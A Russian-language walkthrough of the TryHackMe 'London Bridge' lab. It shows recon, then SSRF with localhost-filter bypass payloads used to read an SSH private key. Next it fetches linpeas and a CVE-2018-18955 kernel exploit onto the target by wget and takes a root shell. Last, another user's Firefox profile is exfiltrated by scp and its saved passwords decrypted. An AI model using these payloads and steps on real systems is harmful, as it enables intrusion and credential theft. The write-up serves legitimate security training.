# The London Bridge
- https://tryhackme.com/room/thelondonbridge
## Разведка

nmap -sC -sV
- Стандартные скрипты
- сканирование версий

```zsh
└─$ nmap -sC -sV 10.65.147.43
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-12 14:42 +0300
Nmap scan report for 10.65.147.43
Host is up (0.15s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 58:c1:e4:79:ca:70:bc:3b:8d:b8:22:17:2f:62:1a:34 (RSA)
|   256 2a:b4:1f:2c:72:35:7a:c3:7a:5c:7d:47:d6:d0:73:c8 (ECDSA)
|_  256 1c:7e:d2:c9:dd:c2:e4:ac:11:7e:45:6a:2f:44:af:0f (ED25519)
8080/tcp open  http    Gunicorn
|_http-server-header: gunicorn
|_http-title: Explore London
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.57 seconds
```

22 - ssh
8080 - http

Посмотрим что на 8080.
<img width="1470" height="847" alt="Pasted image 20260112150652" src="https://github.com/user-attachments/assets/9f6d789a-194b-4b35-a854-6c8fb2404cc0" />

<img width="1470" height="774" alt="Pasted image 20260113161242" src="https://github.com/user-attachments/assets/0ad28cf5-2225-4bc2-814e-f251a9c0fcdc" />

<img width="1470" height="845" alt="Pasted image 20260112150724" src="https://github.com/user-attachments/assets/7cc396bb-049d-4287-9ca3-336199c3a0fd" />


Перед нами небольшой сайт, с несколькими потенциально уязвимыми страницами.
1. Форма обратной связи
2. Форма загрузки фото

Пробуем перебирать разные директории
```zsh
└─$ feroxbuster -u http://10.65.147.43:8080/ -w `   raft-small-words.txt   ` -x php,txt --dont-extract-links

200      GET       82l      256w     2682c http://10.65.147.43:8080/
200      GET       59l      127w     1703c http://10.65.147.43:8080/contact
405      GET        4l       23w      178c http://10.65.147.43:8080/upload
200      GET       54l      125w     1722c http://10.65.147.43:8080/gallery
405      GET        4l       23w      178c http://10.65.147.43:8080/feedback
405      GET        4l       23w      178c http://10.65.147.43:8080/view_image

```

На этом этапе я уже попробовал закинуть XSS в форму обратной связи и пробовал закинуть php revers shell в форму загрузки изображений, там стоит фильтрация. Не буду это показывать, просто поймите, что после тщательной разведки нужно проверить все конечные точки и убедится в отсутствии простых уязвимостей, затем уже копать глубже и так далее, я же покажу только успешную эксплуатацию.
## Эксплуатация и SSRF 

При переборе директорий находим /view_image, есть форма которая запрашивает url пикчи. 
<img width="1049" height="257" alt="Pasted image 20260112150604" src="https://github.com/user-attachments/assets/373aa4d4-d02e-4a36-8fa0-0342ee8d30ec" />


Посмотрим как обрабатывается наш запрос на возвращение пикчи
<img width="929" height="492" alt="Pasted image 20260113164204" src="https://github.com/user-attachments/assets/98d5e7a0-eab4-4e4a-a1a8-c397ba22de83" />

Видим, что наши входные данные вставляются в JS, можно попробовать обратится к самому же серверу, и вернуть данные с него. 
```html
<img scr="test">
```
Если на сервере нет защиты от запроса веб сервера к серверу, то мы получим SSRF.
>**SSRF (Server-Side Request Forgery)** — это уязвимость, при которой злоумышленник заставляет **сервер** выполнять запросы **туда, куда хочет он**, а не куда задумано разработчиком. **Ты подсовываешь серверу URL, и сервер сам обращается по этому адресу**

Корректное обращение к серверу, за фотографией
<img width="1470" height="849" alt="Pasted image 20260112150737" src="https://github.com/user-attachments/assets/ba70cae2-1346-4462-b07a-7fa10610179b" />


<img width="878" height="473" alt="Pasted image 20260112150834" src="https://github.com/user-attachments/assets/73948b5d-1a13-4957-ae9b-2c7a81ce24c1" />

Все так, сайт делает запрос к содержимому серера, поэтому и вернулось изборажение лежащее на сервере.

Но вот что самое интересное, если мы сделаем запрос 
```zsh
image_url=http://127.0.0.1/test
```
То сервер нам ничего не вернет, мы можем сделать вывод, что параметр image_url фильтруется и не дает доступ к серверу. 

<img width="810" height="157" alt="Pasted image 20260112151436" src="https://github.com/user-attachments/assets/b5eb9972-6132-4a59-a30b-a47575b5744f" />

Тут есть небольшая подсказка. Давайте попробуем перебрать параметры, может есть не фильтруемый параметр 

```zsh
└─$ ffuf -w directory-list-lowercase-2.3-medium.txt -X POST -u 'http://thelondonbridge.thm:8080/view_image' -H 'Content-Type: application/x-www-form-urlencoded' -d 'FUZZ=/uploads/04.jpg' -fw 226 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://thelondonbridge.thm:8080/view_image
 :: Wordlist         : FUZZ: /home/obsca/Downloads/directory-list-lowercase-2.3-medium.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : FUZZ=/uploads/04.jpg
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 226
________________________________________________

www                     [Status: 500, Size: 290, Words: 37, Lines: 5, Duration: 142ms]
:: Progress: [4682/207643] :: Job [1/1] :: 337 req/sec :: Duration: [0:00:14] :: Errors: 0 ::^Z
zsh: suspended  ffuf -w directory-list-lowercase-2.3-medium.txt -X POST -u  -H  -d  -fw 226
```
Отлично! Мы нашли параметр www, видимо такой энпоинт существует, непонятно только где и как он используется, либо его вообще нигде нет на фронте, либо входные данные с image_url после фильтрации передаются на www 

<img width="1019" height="452" alt="Pasted image 20260112152435" src="https://github.com/user-attachments/assets/70d1bcf0-99a5-478f-81b1-5062b077bba9" />

Но получаем по лбу.

<img width="1017" height="452" alt="Pasted image 20260112152504" src="https://github.com/user-attachments/assets/121249d5-923a-4744-9419-9b21b08d6083" />

Тут тоже получили по лбу. 

Перебираем значения для параметра www
```zsh
└─$ ffuf -w ssrf.txt -X POST -u 'http://thelondonbridge.thm:8080/view_image' -H 'Content-Type: application/x-www-form-urlencoded' -d 'www=http://FUZZ' -fw 27

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://thelondonbridge.thm:8080/view_image
 :: Wordlist         : FUZZ: /home/obsca/Downloads/ssrf.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : www=http://FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 27
________________________________________________

0                       [Status: 200, Size: 1270, Words: 230, Lines: 37, Duration: 134ms]
127.0.0.0               [Status: 500, Size: 290, Words: 37, Lines: 5, Duration: 151ms]
127.127.127.127         [Status: 500, Size: 290, Words: 37, Lines: 5, Duration: 151ms]
2130706433/             [Status: 200, Size: 1270, Words: 230, Lines: 37, Duration: 155ms]
[0000::1]:8080/         [Status: 500, Size: 290, Words: 37, Lines: 5, Duration: 159ms]
[::]:8080/              [Status: 500, Size: 290, Words: 37, Lines: 5, Duration: 166ms]
①②⑦.⓪.⓪.⓪               [Status: 500, Size: 290, Words: 37, Lines: 5, Duration: 169ms]
[::]:25/ SMTP           [Status: 500, Size: 290, Words: 37, Lines: 5, Duration: 180ms]
017700000001            [Status: 200, Size: 1270, Words: 230, Lines: 37, Duration: 193ms]
127.1:8080              [Status: 200, Size: 2682, Words: 871, Lines: 83, Duration: 189ms]
[::]:3128/ Squid        [Status: 500, Size: 290, Words: 37, Lines: 5, Duration: 205ms]
127.0.1.3               [Status: 500, Size: 290, Words: 37, Lines: 5, Duration: 211ms]
0x7f000001/             [Status: 200, Size: 1270, Words: 230, Lines: 37, Duration: 221ms]
st:00011211aaaa         [Status: 500, Size: 290, Words: 37, Lines: 5, Duration: 125ms]
0/                      [Status: 200, Size: 1270, Words: 230, Lines: 37, Duration: 128ms]
127.1                   [Status: 200, Size: 1270, Words: 230, Lines: 37, Duration: 126ms]
127.0.1                 [Status: 200, Size: 1270, Words: 230, Lines: 37, Duration: 127ms]
1.1.1.1 &@2.2.2.2# @3.3.3.3/ [Status: 500, Size: 290, Words: 37, Lines: 5, Duration: 139ms]
127.1.1.1:8080#\@127.2.2.2:8080/ [Status: 200, Size: 2682, Words: 871, Lines: 83, Duration: 138ms]
127.1.1.1:8080:\@@127.2.2.2:8080/ [Status: 200, Size: 2682, Words: 871, Lines: 83, Duration: 141ms]
127.1.1.1:8080\@127.2.2.2:8080/ [Status: 200, Size: 2682, Words: 871, Lines: 83, Duration: 125ms]
:: Progress: [52/52] :: Job [1/1] :: 2 req/sec :: Duration: [0:00:20] :: Errors: 4 ::

```
Есть несколько 200.
127.0.0.1
127.0.0.2
127.0.0.99
127.123.123.123
127.1
127.0.1
127.0001
Все это одно и тоже, по всем этим запросам начиная с октета 127. сервер будет обращаться сам к себе. Это можно использовать если стоит запрет на обращение к 127.0.0.1

Давайте попробуем перебрать порты. Быстрым движением руки мы создадим текстовый файл с числами от 1 до 65365 и закинем это дело в ffuf.
```zsh
└─$ seq 65365 > ports.txt
```


```zsh
└─$ ffuf -w ports.txt -X POST -u 'http://thelondonbridge.thm:8080/view_image' -H 'Content-Type: application/x-www-form-urlencoded' -d 'www=http://127.1:FUZZ' -fw 37

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://thelondonbridge.thm:8080/view_image
 :: Wordlist         : FUZZ: /home/obsca/Downloads/ports.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : www=http://127.1:FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 37
________________________________________________

80                      [Status: 200, Size: 1270, Words: 230, Lines: 37, Duration: 190ms]
8080                    [Status: 200, Size: 2682, Words: 871, Lines: 83, Duration: 217ms]
:: Progress: [9582/65365] :: Job [1/1] :: 227 req/sec :: Duration: [0:00:41] :: Errors: 0 ::^Z
zsh: suspended  ffuf -w ports.txt -X POST -u 'http://thelondonbridge.thm:8080/view_image' -H 
```

И вот спустя несколько переборов мы получаем работающее значение для параметра www. 
<img width="1023" height="519" alt="Pasted image 20260112153043" src="https://github.com/user-attachments/assets/8ad98813-0e7f-43fd-a00f-8c97ea8fb78b" />



Теперь переберем директории. (Для понимания того что происходит: Мы перебираем директории сервера и то, к чему и как веб сервер может обратится)
```zsh
└─$ ffuf -w directory-list-lowercase-2.3-medium.txt -X POST -u 'http://thelondonbridge.thm:8080/view_image' -H 'Content-Type: application/x-www-form-urlencoded' -d 'www=http://127.1:80/FUZZ' -fw 96 -ic

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://thelondonbridge.thm:8080/view_image
 :: Wordlist         : FUZZ: /home/obsca/Downloads/directory-list-lowercase-2.3-medium.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : www=http://127.1:80/FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 96
________________________________________________

                        [Status: 200, Size: 1270, Words: 230, Lines: 37, Duration: 126ms]
templates               [Status: 200, Size: 1294, Words: 358, Lines: 44, Duration: 155ms]
uploads                 [Status: 200, Size: 695, Words: 24, Lines: 23, Duration: 139ms]
static                  [Status: 200, Size: 420, Words: 19, Lines: 18, Duration: 139ms]
```
Получаем несколько директорий и смотрим че там.

<img width="1022" height="558" alt="Pasted image 20260112153907" src="https://github.com/user-attachments/assets/6981aaed-afd4-46d8-bfee-0d0d753fbc2d" />

По этим директориям ничего интересно нет, только текст про мост в Лондоне или тп. Давайте запустим перебор директорий побольше.
```zsh
└─$ ffuf -w raft-medium-words-lowercase.txt -X POST -u 'http://thelondonbridge.thm:8080/view_image' -H 'Content-Type: application/x-www-form-urlencoded' -d 'www=http://127.1:80/FUZZ' -fw 96 -ic

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://thelondonbridge.thm:8080/view_image
 :: Wordlist         : FUZZ: /home/obsca/Downloads/raft-medium-words-lowercase.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : www=http://127.1:80/FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 96
________________________________________________

templates               [Status: 200, Size: 1294, Words: 358, Lines: 44, Duration: 218ms]
uploads                 [Status: 200, Size: 695, Words: 24, Lines: 23, Duration: 145ms]
static                  [Status: 200, Size: 420, Words: 19, Lines: 18, Duration: 140ms]
.                       [Status: 200, Size: 1270, Words: 230, Lines: 37, Duration: 137ms]
.cache                  [Status: 200, Size: 474, Words: 19, Lines: 18, Duration: 124ms]
.local                  [Status: 200, Size: 414, Words: 19, Lines: 18, Duration: 138ms]
.ssh                    [Status: 200, Size: 399, Words: 18, Lines: 17, Duration: 135ms]
.bashrc                 [Status: 200, Size: 3771, Words: 522, Lines: 118, Duration: 133ms]
.bash_logout            [Status: 200, Size: 220, Words: 35, Lines: 8, Duration: 125ms]
.bash_history           [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 123ms]
```
.ssh звучит интересно, если удастся получить privat и public key мы сможем подключится по ssh. Читаем public key, там лежит юзернейм для подключения. Как мы видим
```
beth
```
<img width="1023" height="517" alt="Pasted image 20260112154335" src="https://github.com/user-attachments/assets/8b802ee0-d95b-405c-94ff-9b826f696421" />

Приватный ключ: 
<img width="1019" height="516" alt="Pasted image 20260112154529" src="https://github.com/user-attachments/assets/d8886c6d-d8b8-4507-adba-4f91f577cd1c" />

Копируем к себе 
```zsh
└─$ echo '-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAz1yFrg9FAZAI4R37aQWn/ePTk/MKfz2KQ+OE45KErguL34Yj
*****
fDLzMA915WcODR6L0mWO0crAMbZQOkg1KlAiwQSQmuUpPqyAfq6x
-----END RSA PRIVATE KEY-----
' > id_rsa
```

И подключаемся через ssh
```zsh
└─$ ssh -i id_rsa beth@thelondonbridge.thm
The authenticity of host 'thelondonbridge.thm (10.65.147.43)' can't be established.
ED25519 key fingerprint is: SHA256:ytPniu9JUHpepgFs9WjrDo4KrlD74N5VR4L5MCCx3D8
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'thelondonbridge.thm' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch
Last login: Mon May 13 22:38:30 2024 from 192.168.62.137
beth@london:~$
```

## USER
через find находим флаг
```zsh
beth@london:~$ ls
app.py  gunicorn_config.py  index.html  __pycache__  static  templates  uploads
beth@london:~$ find / -type f -name user.txt 2> /dev/null
/home/beth/__pycache__/user.txt
beth@london:~$ cat /home/beth/__pycache__/user.txt
THM{REDACTED}
```

## ROOT 

У себя на машине откроем linpeas. Это прога для повышения привилегий в Linux, если отправим ее на атакуемую машину, она просканирует файлы, ядро и найдет способ повысить привилегии.
```zsh
└─$ linpeas   

> peass ~ Privilege Escalation Awesome Scripts SUITE

/usr/share/peass/linpeas
├── linpeas_darwin_amd64
├── linpeas_darwin_arm64
├── linpeas_fat.sh
├── linpeas_linux_386
├── linpeas_linux_amd64
├── linpeas_linux_arm
├── linpeas_linux_arm64
├── linpeas.sh
└── linpeas_small.sh

```

У себя в директории с linpeas.sh откроем http сервер
```zsh
└─$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.64.162.64 - - [12/Jan/2026 21:56:48] "GET /linpeas.sh HTTP/1.1" 200 -
```

На атакуемой машине через wget обратимся к своей машине и получим linpeas.sh 
свой IP для сети TryHackMe можно посмотреть командой, он будет в поле c tun0
```zsh
ip a
```

```zsh
beth@london:~$ wget http://192.168.135.72/linpeas.sh
--2026-01-12 10:56:47--  http://192.168.135.72/linpeas.sh
Connecting to 192.168.135.72:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 975444 (953K) [application/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh                      100%[======================================================>] 952.58K   639KB/s    in 1.5s    

2026-01-12 10:56:49 (639 KB/s) - ‘linpeas.sh’ saved [975444/975444]

beth@london:~$ chmod +x linpeas.sh
beth@london:~$ ./linpeas.sh
```
Запускаем linpeas и ждем когда пока скрипт выполнится, это занимает некоторое время. 
``` zsh
[+] [CVE-2018-18955] subuid_shell

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1712
   Exposure: probable
   Tags: [ ubuntu=18.04 ]{kernel:4.15.0-20-generic},fedora=28{kernel:4.16.3-301.fc28}
   Download URL: https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/45886.zip
   Comments: CONFIG_USER_NS needs to be enabled
```
Есть несколько CVE, но это самая подходящая для нашего случая, уязвимость в ядре.
- https://github.com/bcoles/kernel-exploits/tree/master/CVE-2018-18955
Вот эксплойт для нашей CVE. Копируем на атакуемую машину файлы exploit.dbus.sh rootshell.c subshell.c subuid_shell.c

```zsh
└─$ python -m http.server 90
Serving HTTP on 0.0.0.0 port 90 (http://0.0.0.0:90/) ...
10.64.162.64 - - [12/Jan/2026 22:21:31] "GET /exploit.dbus.sh HTTP/1.1" 200 -
10.64.162.64 - - [12/Jan/2026 22:21:41] "GET /rootshell.c HTTP/1.1" 200 -
10.64.162.64 - - [12/Jan/2026 22:21:52] "GET /subshell.c HTTP/1.1" 200 -
10.64.162.64 - - [12/Jan/2026 22:22:02] "GET /subuid_shell.c HTTP/1.1" 200 -
```

```zsh
beth@london:~$ wget http://192.168.135.72:90/exploit.dbus.sh
--2026-01-12 11:21:30--  http://192.168.135.72:90/exploit.dbus.sh
Connecting to 192.168.135.72:90... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3829 (3.7K) [application/x-sh]
Saving to: ‘exploit.dbus.sh’

exploit.dbus.sh                 100%[======================================================>]   3.74K  --.-KB/s    in 0.002s  

2026-01-12 11:21:31 (1.82 MB/s) - ‘exploit.dbus.sh’ saved [3829/3829]
```

Запускаем эксплойт
```zsh
beth@london:~$ bash exploit.dbus.sh
[*] Compiling...
[*] Creating /usr/share/dbus-1/system-services/org.subuid.Service.service...
[.] starting
[.] setting up namespace
[~] done, namespace sandbox set up
[.] mapping subordinate ids
[.] subuid: 100000
[.] subgid: 100000
[~] done, mapped subordinate ids
[.] executing subshell
[*] Creating /etc/dbus-1/system.d/org.subuid.Service.conf...
[.] starting
[.] setting up namespace
[~] done, namespace sandbox set up
[.] mapping subordinate ids
[.] subuid: 100000
[.] subgid: 100000
[~] done, mapped subordinate ids
[.] executing subshell
[*] Launching dbus service...
Error org.freedesktop.DBus.Error.NoReply: Did not receive a reply. Possible causes include: the remote application did not send a reply, the message bus security policy blocked the reply, the reply timeout expired, or the network connection was broken.
[+] Success:
-rwsrwxr-x 1 root root 8392 Jan 12 11:23 /tmp/sh
[*] Cleaning up...
[*] Launching root shell: /tmp/sh
root@london:~# id
uid=0(root) gid=0(root) groups=0(root),1000(beth)
```

И получаем ROOT!
```zsh
root@london:~# cd /root
root@london:/root# ls -la
total 52
drwx------  6 root root 4096 Apr 23  2024 .
drwxr-xr-x 23 root root 4096 Apr  7  2024 ..
lrwxrwxrwx  1 root root    9 Sep 18  2023 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwx------  3 root root 4096 Apr 23  2024 .cache
-rw-r--r--  1 beth beth 2246 Mar 16  2024 flag.py
-rw-r--r--  1 beth beth 2481 Mar 16  2024 flag.pyc
drwx------  3 root root 4096 Apr 23  2024 .gnupg
drwxr-xr-x  3 root root 4096 Sep 16  2023 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
drwxr-xr-x  2 root root 4096 Mar 16  2024 __pycache__
-rw-rw-r--  1 root root   27 Sep 18  2023 .root.txt
-rw-r--r--  1 root root   66 Mar 10  2024 .selected_editor
-rw-r--r--  1 beth beth  175 Mar 16  2024 test.py
root@london:/root# cat .root.txt
```
## Пароль Charles

Есть папка .mozilla, теоретически, там могут лежать сохраненные пароли, я погуглил и нашел утилиту firefox_decrypt.py

- https://github.com/unode/firefox_decrypt

```zsh
root@london:/root# cd /home
root@london:/home# ls
beth  charles
root@london:/home# cd charles
root@london:/home/charles# ls
root@london:/home/charles# ls -la
total 24
drw------- 3 charles charles 4096 Apr 23  2024 .
drwxr-xr-x 4 root    root    4096 Mar 10  2024 ..
lrwxrwxrwx 1 root    root       9 Apr 23  2024 .bash_history -> /dev/null
-rw------- 1 charles charles  220 Mar 10  2024 .bash_logout
-rw------- 1 charles charles 3771 Mar 10  2024 .bashrc
drw------- 3 charles charles 4096 Mar 16  2024 .mozilla
-rw------- 1 charles charles  807 Mar 10  2024 .profile
```


```zsh
root@london:/home/charles/.mozilla# ls -la
total 12
drw------- 3 charles charles 4096 Mar 16  2024 .
drw------- 3 charles charles 4096 Apr 23  2024 ..
drw------- 3 charles charles 4096 Mar 16  2024 firefox
```

Архивируем
```zsh
root@london:/home/charles/.mozilla# ls -la firefox/
total 12
drw-------  3 charles charles 4096 Mar 16  2024 .
drw-------  3 charles charles 4096 Mar 16  2024 ..
drw------- 16 charles beth    4096 Mar 16  2024 8k3bf3zp.charles
root@london:/home/charles/.mozilla# tar -cvzf /tmp/firefox.tar.gz firefox
```

И принимаем со своей машины
```
└─$ scp -i id_rsa beth@10.64.162.64:/tmp/firefox.tar.gz .
```

Разархивируем 
```zsh
└─$ tar -xvzf firefox.tar.gz
```
Выдаем права файлу
```zsh
└─$ sudo chmod -R 777 firefox
```

И с помощью найденой утилиты получим пароль
```zsh
└─$ python3 firefox_decrypt.py firefox/8k3bf3zp.charles 
2026-01-12 22:30:50,003 - WARNING - profile.ini not found in firefox/8k3bf3zp.charles
2026-01-12 22:30:50,003 - WARNING - Continuing and assuming 'firefox/8k3bf3zp.charles' is a profile location

Website:   https://www.buckinghampalace.com
Username: 'Charles'
Password: '[REDACTED]'
```

## Итог: почему удалось взломать?
1. SSRF
2. Старая версия ядра
